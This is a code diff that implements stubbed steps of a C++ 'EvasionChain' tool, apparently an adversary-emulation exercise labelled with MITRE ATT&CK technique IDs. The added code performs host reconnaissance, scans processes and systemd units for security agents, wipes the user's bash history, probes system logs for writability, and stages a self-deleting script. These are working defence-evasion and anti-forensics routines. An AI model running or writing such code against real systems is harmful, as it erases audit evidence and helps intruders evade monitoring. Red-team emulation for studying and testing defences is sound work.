@@ -40,9 +40,14 @@ void EvasionChain::run_all() const {
 void EvasionChain::step01_host_recon() const {
   log(">>> Step 01 — host recon (T1082 / T1016)");
   std::ostringstream out;
-  // TODO: get hostname
+  char hostname[256]{};
+  gethostname(hostname, sizeof(hostname));
+  out << "=== hostname ===\n" << hostname << '\n';
 
-  // TODO: get kernel information
+  utsname uts{};
+  uname(&uts);
+  out << "=== uname ===\n" << uts.sysname << ' ' << uts.nodename << ' ' << uts.release << ' '
+      << uts.version << ' ' << uts.machine << '\n';
 
   out << "=== os-release ===\n" << read_file("/etc/os-release") << '\n';
   out << "=== ip ===\n" << run_capture("ip -4 addr show 2>/dev/null || ifconfig 2>/dev/null") << '\n';
@@ -55,9 +60,15 @@ void EvasionChain::step01_host_recon() const {
 void EvasionChain::step02_discover_agents() const {
   log(">>> Step 02 — discover security agents (T1518 / T1685)");
   std::ostringstream out;
-  // TODO: read from /proc/<PID>/cmdline, and check for known agents:
-
-  // TODO: enumerate systemd service units
+  for (const auto& line : read_proc_cmdlines()) {
+    if (matches_agent_pattern(line)) out << line << '\n';
+  }
+  const auto services = run_capture("systemctl list-units --type=service --all 2>/dev/null");
+  std::istringstream ss(services);
+  std::string line;
+  while (std::getline(ss, line)) {
+    if (matches_agent_pattern(line)) out << line << '\n';
+  }
   if (out.str().empty()) out << "(no matching agents in lab — expected)\n";
   write_file(staging("security-agents.txt"), out.str());
 
@@ -114,9 +125,19 @@ void EvasionChain::step04_ld_preload_hide() const {
 
 void EvasionChain::step05_anti_forensics() const {
   log(">>> Step 05 — anti-forensics (T1070)");
-  // TODO: trim command history
+  const char* home = std::getenv("HOME");
+  const auto histfile =
+      home ? std::filesystem::path(home) / ".bash_history" : std::filesystem::path("/root/.bash_history");
+  write_file(histfile, "");
+  log("History cleared: " + histfile.string());
 
-  // TODO: trim log files
+  for (const char* logfile : {"/var/log/syslog", "/var/log/auth.log", "/var/log/messages"}) {
+    if (file_writable(logfile)) {
+      warn(std::string("Writable log found: ") + logfile);
+    } else {
+      append_file(staging("log-status.txt"), std::string("protected: ") + logfile + "\n");
+    }
+  }
 
   const auto self_delete = staging("run-once.sh");
   write_file(self_delete, "#!/bin/bash\necho payload executed\nrm -f \"$0\"\n");
